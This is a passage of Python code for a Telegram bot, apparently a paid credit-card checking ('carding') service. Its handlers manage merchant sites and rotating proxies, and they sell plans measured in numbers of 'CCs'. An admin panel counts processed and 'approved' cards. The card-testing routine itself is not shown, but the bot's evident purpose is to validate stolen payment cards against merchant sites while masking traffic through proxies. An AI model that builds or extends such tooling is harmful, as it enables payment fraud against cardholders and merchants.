async def add_site_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Usage: /add site.com", emoji_ids=[CE["warn"]])
    sites = extract_urls_from_text(text)
    if not sites:
        return await styled_reply(event, f"{PE} No valid URLs", emoji_ids=[CE["cross"]])
    added = 0
    for site in sites:
        if await add_site_db(event.sender_id, site):
            added += 1
    await styled_reply(event, f"{PE} Added {added}/{len(sites)} sites", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def rm_site_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    text = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Usage: /rm site.com", emoji_ids=[CE["warn"]])
    sites = extract_urls_from_text(text)
    removed = 0
    for site in sites:
        if await remove_site_db(event.sender_id, site):
            removed += 1
    await styled_reply(event, f"{PE} Removed {removed}/{len(sites)} sites", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]check\b'))
async def check_sites_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    proxy = await get_random_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} Proxy required", emoji_ids=[CE["warn"]])
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites in DB", emoji_ids=[CE["warn"]])
    status_msg = await styled_reply(event, f"{PE} Checking {len(sites)} sites...", emoji_ids=[CE["globe"]])
    working = []
    dead = []
    for site in sites:
        res = await test_single_site(site, user_id=event.sender_id)
        if res['status'] == 'working':
            working.append(site)
        else:
            dead.append(site)
    for d in dead:
        await remove_site_db(event.sender_id, d)
    result = f"{PE} Check done\n━━━━━━━━━━━━━━━━━\n✅ Working: {len(working)}\n❌ Dead (removed): {len(dead)}"
    await styled_edit(status_msg, result, emoji_ids=[CE["globe"], CE["tick"], CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy(\s|$)'))
async def addpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private only", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    await ensure_user(event.sender_id)

    proxy_lines = []
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        if reply_msg.document:
            file_path = await reply_msg.download_media()
            try:
                async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                    content = await f.read()
                    proxy_lines = [line.strip() for line in content.splitlines() if line.strip()]
            except Exception as e:
                await styled_reply(event, f"{PE} Error reading file: {e}", emoji_ids=[CE["cross"]])
                return
            finally:
                try:
                    os.remove(file_path)
                except OSError:
                    pass
        elif reply_msg.text:
            proxy_lines = [line.strip() for line in reply_msg.text.splitlines() if line.strip()]
    if not proxy_lines:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 2:
            proxy_lines = [line.strip() for line in parts[1].splitlines() if line.strip()]
    if not proxy_lines:
        return await styled_reply(event,
            f"{PE} <b>Usage:</b>\n"
            f"<code>/addpxy ip:port:user:pass</code>\n"
            f"<code>/addpxy ip:port</code>\n\n"
            f"Or reply to a .txt file with proxies (one per line)",
            emoji_ids=[CE["warn"]])

    current_count = await get_proxy_count(event.sender_id)
    if current_count >= 100:
        return await styled_reply(event, f"{PE} Proxy limit reached (100/100). Use /rmpxy", emoji_ids=[CE["cross"]])

    parsed_proxies = []
    invalid_lines = []
    for line in proxy_lines:
        proxy_data = parse_proxy_format(line)
        if not proxy_data:
            invalid_lines.append(line)
        else:
            parsed_proxies.append(proxy_data)
    if not parsed_proxies:
        return await styled_reply(event, f"{PE} No valid proxies found.", emoji_ids=[CE["cross"]])

    slots_available = 100 - current_count
    if len(parsed_proxies) > slots_available:
        parsed_proxies = parsed_proxies[:slots_available]
        await styled_reply(event, f"{PE} Only adding {slots_available} proxies (limit 100)", emoji_ids=[CE["warn"]])

    status_msg = await styled_reply(event, f"{PE} Testing {len(parsed_proxies)} proxies...", emoji_ids=[CE["shield"]])
    added = []
    failed = []
    for proxy_data in parsed_proxies:
        ok, ip = await test_proxy(proxy_data['proxy_url'])
        if ok:
            await add_proxy_db(event.sender_id, proxy_data)
            added.append(proxy_data)
        else:
            failed.append(proxy_data)

    result_text = f"{PE} <b>Added {len(added)} working proxies</b>\n" if added else f"{PE} <b>No working proxies added</b>\n"
    for p in added:
        auth = f" ━ {p['username']}" if p.get('username') else ""
        result_text += f"┃ {p['type'].upper()} ━ {p['ip']}:{p['port']}{auth}\n"
    if failed:
        result_text += f"\n{PE} Failed ({len(failed)}):\n"
        for f in failed[:5]:
            result_text += f"┃ {f['type'].upper()} ━ {f['ip']}:{f['port']}\n"
        if len(failed) > 5:
            result_text += f"┃ ... and {len(failed)-5} more\n"
    if invalid_lines:
        result_text += f"\n{PE} Invalid format: {len(invalid_lines)} lines skipped"
    new_count = current_count + len(added)
    result_text += f"\n\n━━━━━━━━━━━━━━━━━\n📊 Total proxies: {new_count}/100"
    await styled_edit(status_msg, result_text, emoji_ids=[CE["check"], CE["tick"], CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def list_proxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private only", emoji_ids=[CE["stop"]])
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies", emoji_ids=[CE["cross"]])
    lines = [f"{i+1}. {p['proxy_type']} ━ {p['ip']}:{p['port']}" for i,p in enumerate(proxies)]
    await styled_reply(event, f"{PE} Proxies ({len(proxies)}/100)\n" + "\n".join(lines), emoji_ids=[CE["shield"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def chkpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private only", emoji_ids=[CE["stop"]])
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies", emoji_ids=[CE["cross"]])
    msg = await styled_reply(event, f"{PE} Testing {len(proxies)} proxies...", emoji_ids=[CE["shield"]])
    working = []
    dead = []
    for p in proxies:
        ok, _ = await test_proxy(p['proxy_url'])
        if ok:
            working.append(p)
        else:
            dead.append(p)
    await styled_edit(msg, f"{PE} Working: {len(working)} | {PE} Dead: {len(dead)}", emoji_ids=[CE["tick"], CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy(\s.+)?$'))
async def rmpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private only", emoji_ids=[CE["stop"]])
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies", emoji_ids=[CE["cross"]])
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, f"{PE} Usage: /rmpxy index or all", emoji_ids=[CE["warn"]])
    arg = parts[1].strip().lower()
    if arg == 'all':
        count = await clear_all_proxies(event.sender_id)
        await styled_reply(event, f"{PE} Removed {count} proxies", emoji_ids=[CE["check"]])
    else:
        try:
            idx = int(arg)-1
            removed = await remove_proxy_by_index(event.sender_id, idx)
            if removed:
                await styled_reply(event, f"{PE} Removed {removed['ip']}:{removed['port']}", emoji_ids=[CE["check"]])
            else:
                await styled_reply(event, f"{PE} Invalid index", emoji_ids=[CE["cross"]])
        except Exception as e:
            logger.warning("rmpxy parse error: %s", e)
            await styled_reply(event, f"{PE} Invalid index", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    sites = await get_user_sites(event.sender_id)
    proxies = await get_all_user_proxies(event.sender_id)
    text = f"{PE} <b>Profile</b>\n━━━━━━━━━━━━━━━━━\nID: {event.sender_id}\nPlan: {plan.upper()}\nCC Limit: {limit}\nSites: {len(sites)}\nProxies: {len(proxies)}"
    await styled_reply(event, text, emoji_ids=[CE["info"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
async def redeem_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} Usage: /redeem KEY", emoji_ids=[CE["warn"]])
    key = parts[1].upper()
    success, msg = await use_key(event.sender_id, key)
    if success:
        await styled_reply(event, f"{PE} {msg}", emoji_ids=[CE["gift"]])
    else:
        await styled_reply(event, f"{PE} {msg}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def plan_cmd(event):
    plan = await get_user_plan(event.sender_id)
    text = f"""{PE} <b>Plans</b>
━━━━━━━━━━━━━━━━━
<b>FREE</b>: 300 CCs (group only)
<b>PRO</b>: 2000 CCs + proxy + private
<b>TOJI</b>: 5000 CCs + priority
━━━━━━━━━━━━━━━━━
Your plan: <b>{plan.upper()}</b>
Contact @MRROOTTG"""
    await styled_reply(event, text, emoji_ids=[CE["crown"]])

@client.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    try:
        total_users = await get_total_users()
        total_premium = await get_premium_count()
        total_free = total_users - total_premium
        total_sites = await get_total_sites_count()
        all_keys = await get_all_keys()
        total_keys = len(all_keys)
        used_keys = len([k for k in all_keys if k.get('used', False)])
        unused_keys = total_keys - used_keys
        total_cards = await get_total_cards_count()
        approved_cards = await get_approved_count()

        stats_text = f"""{PE} <b>BOT STATISTICS</b>
━━━━━━━━━━━━━━━━━
👥 <b>USERS</b>
━ Total: {total_users}
━ Premium: {total_premium}
━ Free: {total_free}

🌐 <b>SITES</b>
━ Total added: {total_sites}

🔑 <b>KEYS</b>
━ Generated: {total_keys}
━ Used: {used_keys}
━ Unused: {unused_keys}

💳 <b>CARD STATS</b>
━ Processed: {total_cards}
━ Approved: {approved_cards}
━━━━━━━━━━━━━━━━━
⚡ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        await styled_reply(event, stats_text, emoji_ids=[CE["chart"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/genkey'))
async def genkey_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 4:
        return await styled_reply(event, f"{PE} Usage: /genkey pro 5 30", emoji_ids=[CE["warn"]])
    plan_type = parts[1].lower()
    amount = int(parts[2])
    days = int(parts[3])
    if plan_type not in ('free','pro','toji'):
        return await styled_reply(event, f"{PE} Invalid plan", emoji_ids=[CE["cross"]])
    keys = []
    for _ in range(min(amount,20)):
        k = ''.join(random.choices(string.ascii_uppercase+string.digits, k=12))
        await create_key(k, days, plan_type)
        keys.append(k)
    await styled_reply(event, f"{PE} Generated {len(keys)} keys:\n" + "\n".join(keys), emoji_ids=[CE["gift"]])

@client.on(events.NewMessage(pattern='/ban'))
async def ban_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} /ban user_id", emoji_ids=[CE["warn"]])
    uid = int(parts[1])
    await ban_user(uid, event.sender_id)
    await styled_reply(event, f"{PE} Banned {uid}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/unban'))
async def unban_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} /unban user_id", emoji_ids=[CE["warn"]])
    uid = int(parts[1])
    await unban_user(uid)
    await styled_reply(event, f"{PE} Unbanned {uid}", emoji_ids=[CE["check"]])

# ---------- MAIN ----------
async def main():
    try:
        await init_db()
        logger.info("MongoDB initialized successfully")
    except Exception as e:
        logger.critical("Failed to initialize MongoDB: %s", e)
        raise

    logger.info("Starting bot...")
    await client.start(bot_token=BOT_TOKEN)
    me = await client.get_me()
    logger.info("Bot is running! Logged in as @%s (ID: %s)", me.username, me.id)
    logger.info("Registered %d event handlers", len(client.list_event_handlers()))
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
